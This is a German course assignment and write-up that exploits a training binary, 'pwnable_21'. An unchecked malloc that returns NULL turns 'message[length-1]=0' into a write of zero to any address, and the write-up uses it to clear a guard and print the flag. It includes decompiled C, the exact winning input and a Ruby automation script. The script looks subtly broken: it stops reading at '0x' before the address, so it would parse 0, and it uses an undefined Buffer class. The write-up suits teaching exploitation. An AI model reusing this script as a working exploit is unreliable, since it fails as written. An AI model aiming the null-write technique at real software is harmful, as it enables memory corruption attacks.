
# Assignment: Analyse mit Ghidra (pwnable 21)


## Aufgabe

Laden Sie die folgende Datei herunter und analysieren Sie sie in Ghidra:

-pwnable_21
Versuchen Sie eine Schwachstelle zu entdecken und nutzen Sie diese dann aus, um sich das Flag ausgeben zu lassen. Hierbei geht es darum, eine Eingabe zu finden, die das Programm dazu bewegt, das Flag auszugeben.

Tipp: Versuchen Sie die Variable, welche den Aufruf der win()-Funktion kontrolliert durch Ausnutzung einer Schwachstelle zu schreiben.


## Vorgehenweise

Sobald die Speicheranforderung zu groß wird, gibt Malloc einen Nullpointer zurück. Dies könnte dazu führen, dass ein Null-Byte willkürlich im Speicher geschrieben wird, was wiederum eine Bedingung auslösen kann. Für die Automatisierung verwenden wir Ruby.


## Lösungweg
```c
int main() {
  long in_FS_OFFSET;
  size_t length;
  long *leak;
  void *message;
  long canary;
  
  canary = *(long *)(in_FS_OFFSET + 0x28);
  length = 0;
  setup();
  puts("Welcome.");
  leak = (long *)malloc(0x40000);
  *leak = 1;
  printf("Leak: %p\n",leak);
  printf("Length of your message: ");
  __isoc99_scanf(&DAT_00100ff9,&length);
  message = malloc(length);
  write(1,"Enter your message: ",0x14);
  read(0,message,length);
  *(undefined *)((long)message + (length - 1)) = 0;
  write(1,message,length);
  if (*leak == 0) {
    win();
  }
  if (canary != *(long *)(in_FS_OFFSET + 0x28)) {
                  
    __stack_chk_fail();
  }
  return 0;
}
```

In der Main-Funktion werden zunächst mehrere Felder definiert. Dazu gehört auch die Definition einer Länge (length) und einer Nachricht (message), die vom Nutzer eingegeben wird. Die Variable "message" ist ein Zeiger (Pointer). Darüber hinaus gibt es einen sogenannten "Pointer Leak".

Zu Beginn des Programms wird die Länge auf 0 gesetzt und Speicher für "leak" mit einer Größe von 0x40000 Byte allokiert. Dann wird der Wert von *leak auf 1 gesetzt. Als nächstes erfolgt die Nutzereingabe für die Länge, die in die Variable "length" geschrieben wird. Daraufhin wird mit malloc Speicher in der Größe der Eingabe allokiert. Danach wird eine weitere Nutzereingabe gelesen, die in den zuvor allokierten Speicher für "message" geschrieben wird.

An dieser Stelle fällt auf, dass nach dem malloc mit der Länge (Nutzereingabe!) kein Null-Pointer-Check durchgeführt wird. Dies könnte potenziell ausgenutzt werden.

Nachdem die Nachricht eingelesen wurde, wird das letzte Zeichen auf 0 gesetzt, indem *(undefined *)((long)message + (length - 1)) = 0; verwendet wird. Danach wird die Nachricht ausgegeben und überprüft, ob die zuvor auf 1 gesetzte Variable *leak nun 0 ist. Wenn dies der Fall ist, wird die Flagge ausgegeben.

Wir starten das Programm und erhalten die erwarteten Ausgaben sowie die Adresse der Variable *leak. Aufgrund des fehlenden Null-Pointer-Checks können wir jetzt einen Angriff initiieren. Durch *(undefined *)((long)message + (length - 1)) = 0; können wir unsere Eingaben so gestalten, dass *leak auf 0 gesetzt wird.

Wenn malloc einen Nullpointer zurückgibt, weil ein zu großes Speichersegment zugewiesen werden soll, führt dies dazu, dass (in Pseudocode) message[length-1] = 0; den Ausdruck 0[length-1] = 0 ergibt, was zu *(length-1) = 0; führt. Diese Methode ermöglicht es, beliebige Speicherstellen durch 0 zu ersetzen.

Indem wir die Adresse von Leak wählen, sie in eine Dezimalzahl umwandeln und 1 hinzufügen, erhalten wir *(leak) = 0;. Dadurch wird die Bedingung wahr.
Um das Flag zu erhalten, geben wir bspw. folgenden Input. 
```
Welcome.
Leak: 0x7f615f310010
Length of your message: 140056185602065
Enter your message: asd
FLAG{malloc_can_never_fail}
```

Die geleakte Adresse wird in eine Dezimalzahl umgewandelt, um 1 erhöht und als Input für Length of Message eingegeben. Der Input für Enter your message kann danach beliebig sein.

Wir können auch ein script in Ruby schreiben um das ganze zu automatisieren.
Das Script könnte so aussehen :
```ruby
require 'socket'
require 'open3'

class CrackMe
  def initialize
    @verbose = false
    @delay = 0.5
  end

  def read_until(symbol)
    result = ""
    loop do
      c = receive()
      print c if @verbose
      result << c
      break if result[-symbol.length..-1] == symbol
    end
    result
  end

  def read_line
    result = ""
    loop do
      c = receive()
      print c if @verbose
      result << c
      break if c == "\n"
    end
    result
  end

  def send_string(str)
    send(str)
    print "-> #{str}\n" if @verbose
    sleep @delay
  end

  def send_byte(b)
    send(b.chr)
    print "-> #{b.chr}\n" if @verbose
    sleep @delay
  end

  def send_line(str)
    send(str + "\n")
    sleep @delay
  end

  def send_buffer(buf)
    send_buffer = buf.to_a.flatten.pack('c*')
    send(send_buffer)
    print "-> #{buf.to_s}\n" if @verbose
    sleep @delay
  end

  def send_address(address)
    buffer = Buffer.new
    buffer << address
    send_buffer(buffer)
  end

  def solve(s)
    s =~ /(.*)([+\-*\/])(.*).*=/

    left = $1.strip.to_i
    right = $3.strip.to_i
    op = $2.strip

    case op
      when '*'
        left * right
      when '+'
        left + right
      when '-'
        left - right
      when '/'
        left / right
      else
        0
    end
  end

  def close; end

  protected

  def send(data); end

  def receive; end

  class CrackMeExe < CrackMe
    def initialize(read, write)
      super()
      @read = read
      @write = write
    end

    def send(data)
      @write.write(data)
      @write.flush
      @write.ioflush
    end

    def receive
      begin
        @read.getc
      rescue Errno::EIO => e
        ''
      end
    end

    def close
      @write.close
    end
  end
end

crack_me = CrackMe::CrackMeExe.new(*Open3.popen2('./pwnable_21'))
leak = crack_me.read_until("0x").strip.to_i(16)
puts "Leaked value: #{leak}"

crack_me.send_line((leak + 1).to_s)
crack_me.send_line("Ceterum censeo Carthaginem esse delendam")

loop do
  print crack_me.receive
  break if crack_me.receive.empty?
end

```
